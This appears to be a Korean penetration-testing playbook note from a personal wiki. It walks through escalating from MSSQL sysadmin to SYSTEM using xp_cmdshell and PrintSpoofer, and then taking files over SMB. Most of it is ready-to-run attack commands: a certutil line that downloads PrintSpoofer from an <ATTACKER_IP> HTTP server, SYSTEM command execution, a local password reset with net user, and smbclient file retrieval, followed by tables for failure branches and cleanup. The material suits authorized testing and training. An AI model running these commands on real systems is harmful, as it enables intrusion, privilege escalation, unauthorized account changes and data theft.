---
tags:
  - 환경/windows
  - 서비스/mssql
  - 서비스/smb
  - 기능/권한상승
시작상태:
  - Windows MSSQL 서비스의 유효한 로그인 자격 증명 확보
  - Linux 공격 호스트에서 대상 MSSQL 포트 접근 가능
목표:
  - SQL Server 서비스 계정의 운영체제 명령 실행
  - SeImpersonatePrivilege를 이용한 SYSTEM 명령 실행
  - 지정한 Windows 파일을 SMB로 공격 호스트에 회수
필요권한:
  - MSSQL sysadmin 또는 xp_cmdshell 실행 권한
  - SQL Server 서비스 계정 token의 SeImpersonatePrivilege
  - 파일을 읽을 로컬 계정의 SMB 공유 권한
필요정보:
  - MSSQL 대상과 인스턴스
  - 공격 호스트 HTTP 주소와 포트
  - 회수할 Windows 파일 경로
네트워크위치:
  - Linux 공격 호스트에서 MSSQL과 SMB에 직접 또는 피벗 경유 접근
---

# MSSQL sysadmin에서 SYSTEM 권한과 SMB 파일 회수까지

## 시나리오 개요

유효한 MSSQL 로그인으로 서버 역할을 확인하고 `xp_cmdshell`에서 SQL Server 서비스 계정과 `SeImpersonatePrivilege`를 식별한다. HTTP로 PrintSpoofer를 반입해 SYSTEM 명령 실행을 검증한 뒤, 필요한 경우 로컬 사용자 비밀번호를 임시로 재설정하고 `smbclient`로 지정 파일을 회수한다.

## 기준 구조

```text
Linux 공격 호스트
  -> MSSQL/TDS
    -> SQL Server 서비스 계정의 xp_cmdshell
      -> HTTP로 PrintSpoofer 반입
        -> SYSTEM 명령 실행
          -> 로컬 계정 임시 비밀번호 재설정
            -> SMB C$에서 지정 파일 회수
```

## 시작 상태

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| MSSQL 경로 | 대상 TDS 포트에 연결 가능 | `impacket-mssqlclient` 연결 | 인스턴스·포트·피벗·TLS 확인 |
| MSSQL 자격 증명 | SQL 또는 Windows 인증 성공 | `SELECT SYSTEM_USER` | 인증 방식과 계정 표기 확인 |
| 서버 역할 | `sysadmin = 1` 또는 기존 `xp_cmdshell` 실행 권한 | `IS_SRVROLEMEMBER` | [[MSSQL Impersonation 권한 상승]], linked server 확인 |
| 파일 전송 | SQL 호스트에서 공격 호스트 HTTP 포트 연결 가능 | 실제 `certutil` 요청 | listener bind·route·방화벽 확인 |
| SMB 회수 | 공격 호스트에서 SQL 호스트 445/TCP 접근 가능 | SMB 협상 | 피벗·SOCKS와 route 확인 |

## 공격 경로 요약

| 단계 | 실행 위치 | 수행할 행동 | 확인할 출력·상태 | 다음 단계 |
|---|---|---|---|---|
| 1 | Linux 공격 호스트 | [[DB 인증과 데이터 열거]] | MSSQL login과 `sysadmin` 여부 | xp_cmdshell 실행 |
| 2 | MSSQL 프롬프트 | [[MSSQL xp_cmdshell 명령 실행]] | SQL Server 서비스 계정과 `SeImpersonatePrivilege Enabled` | PrintSpoofer 반입 |
| 3 | Linux 공격 호스트와 MSSQL 프롬프트 | [[Certutil로 Windows HTTP 파일 반입]] | HTTP GET, 파일 생성과 hash 일치 | SYSTEM 검증 |
| 4 | MSSQL 프롬프트 | [[PrintSpoofer로 SeImpersonatePrivilege 권한 상승]] | `CreateProcessAsUser() OK`, `nt authority\system` | 필요한 로컬 변경 선택 |
| 5 | SYSTEM 명령 실행 | [[로컬 사용자 비밀번호 재설정]] | 임시 로컬 비밀번호와 인증 성공 | SMB 파일 회수 |
| 6 | Linux 공격 호스트 | [[SMB 인증 공유 파일 수집]] | `getting file`과 로컬 파일 | 내용 확인 후 복구 |

## 1. MSSQL 인증과 서버 역할 확인

```bash
impacket-mssqlclient '<DOMAIN>/<SQL_USER>:<PASSWORD>@<SQL_TARGET>' -windows-auth
```

```sql
SQL> SELECT SYSTEM_USER;
SQL> SELECT IS_SRVROLEMEMBER('sysadmin');
```

`IS_SRVROLEMEMBER`가 `1`이면 MSSQL 서버 설정 변경 후보임을 확인한 것이다. Windows 로컬 관리자나 SYSTEM 권한은 아직 확인되지 않았다.

## 2. xp_cmdshell 실행 계정과 특권 확인

`impacket-mssqlclient`의 `SQL>` 프롬프트에서는 셸 명령 뒤에 Windows 명령을 따옴표 없이 입력한다.

```text
SQL> enable_xp_cmdshell
SQL> xp_cmdshell hostname
SQL> xp_cmdshell whoami
SQL> xp_cmdshell whoami /priv
```

`hostname`과 서비스 계정을 기록한다. `SeImpersonatePrivilege Enabled`는 다음 기법의 전제일 뿐 SYSTEM 실행 성공은 아니다.

## 3. PrintSpoofer 반입

Linux 공격 호스트에서 원본 hash를 기록하고 HTTP 서버를 연다.

```bash
cd <SERVE_DIRECTORY>
sha256sum PrintSpoofer64.exe
python3 -m http.server <HTTP_PORT> --bind <ATTACKER_IP>
```

MSSQL 프롬프트에서 대상 파일을 내려받고 hash를 확인한다.

```text
SQL> xp_cmdshell certutil.exe -f -urlcache -split http://<ATTACKER_IP>:<HTTP_PORT>/PrintSpoofer64.exe C:\Windows\Temp\PrintSpoofer64.exe
SQL> xp_cmdshell certutil.exe -hashfile C:\Windows\Temp\PrintSpoofer64.exe SHA256
```

HTTP 로그의 GET, CertUtil 완료 메시지와 송수신 SHA-256 일치를 모두 확인한다.

## 4. SYSTEM 명령 실행 검증

```text
SQL> xp_cmdshell C:\Windows\Temp\PrintSpoofer64.exe -c "cmd /c whoami"
```

`Found privilege: SeImpersonatePrivilege`, `CreateProcessAsUser() OK`와 `nt authority\system`이 함께 있어야 성공이다.

## 5. 필요한 경우에만 로컬 사용자 비밀번호 재설정

SYSTEM 명령은 이미 확보했지만 SMB 파일 회수에 사용할 로컬 자격 증명이 없고, 비밀번호 변경 영향을 감수할 필요가 있을 때만 수행한다.

```text
SQL> xp_cmdshell C:\Windows\Temp\PrintSpoofer64.exe -c "cmd /c net user <LOCAL_USER> <TEMP_PASSWORD>"
```

`The command completed successfully.`는 로컬 SAM 비밀번호 변경 완료다. 도메인 계정 비밀번호 변경으로 해석하지 않는다.

## 6. SMB로 지정 파일 회수

```bash
smbclient //<SQL_TARGET>/C$ -W WORKGROUP -U '<LOCAL_USER>%<TEMP_PASSWORD>' -c 'cd Users\<TARGET_USER>\Desktop; get <REMOTE_FILE> <LOCAL_FILE>'
```

`getting file`과 공격 호스트의 `<LOCAL_FILE>`을 확인한다. 로그인 성공, `C$` 접속과 파일 `get`은 서로 다른 성공 단계다.

## 실패 시 분기

| 실패 지점·출력 | 먼저 확인할 것 | 다음 경로 |
|---|---|---|
| MSSQL login 실패 | SQL·Windows 인증 방식, 인스턴스·포트 | [[1433_MSSQL]] |
| `enable_xp_cmdshell` 거부 | 현재 login의 `sysadmin`, IMPERSONATE·linked server | [[MSSQL Impersonation 권한 상승]] 또는 [[MSSQL Linked Server 내부 이동]] |
| `SeImpersonatePrivilege` 없음·Disabled | 현재 OS 계정과 token | [[Windows 권한 상승 열거]] |
| HTTP GET 없음 | listener bind, 공격 호스트 주소·포트와 egress | [[상황별 파일 전송]] |
| PrintSpoofer 프로세스 생성 실패 | build·arch·token·실행 차단 | [[PrintSpoofer로 SeImpersonatePrivilege 권한 상승]]의 오류 단계 확인 |
| SMB timeout | 피벗·SOCKS·445/TCP route | [[내부망 경로 확보 후 피벗 구성]] |
| SMB 인증 성공 후 `C$` 거부 | 로컬 관리자 멤버십·UAC 원격 제한·share ACL | 일반 공유 또는 다른 파일 회수 경로 확인 |

## 변경 영향과 복구

| 변경 대상 | 복구 절차 |
|---|---|
| `xp_cmdshell`·advanced options | 변경 전 값이 `0`이었던 설정만 [[MSSQL xp_cmdshell 명령 실행]]의 절차로 복구 |
| PrintSpoofer 파일 | `del C:\Windows\Temp\PrintSpoofer64.exe` |
| 로컬 사용자 비밀번호 | 원래 값을 아는 경우 `net user <LOCAL_USER> <ORIGINAL_PASSWORD>`; 모르면 자동 원복 불가 |
| HTTP 서버 | 파일 반입 완료 후 Python HTTP 서버 종료 |

## 완료 기준

- MSSQL login·DB 역할과 Windows 실행 계정을 구분했다.
- PrintSpoofer 자식 명령에서 `nt authority\system`을 확인했다.
- SMB `get`으로 지정 파일을 공격 호스트에 회수했다.
- 변경한 MSSQL 설정·도구 파일·로컬 계정 비밀번호의 복구 상태를 확인했다.

## 관련 도구

- [[impacket-mssqlclient]]
- [[PrintSpoofer]]
- [[smbclient]]
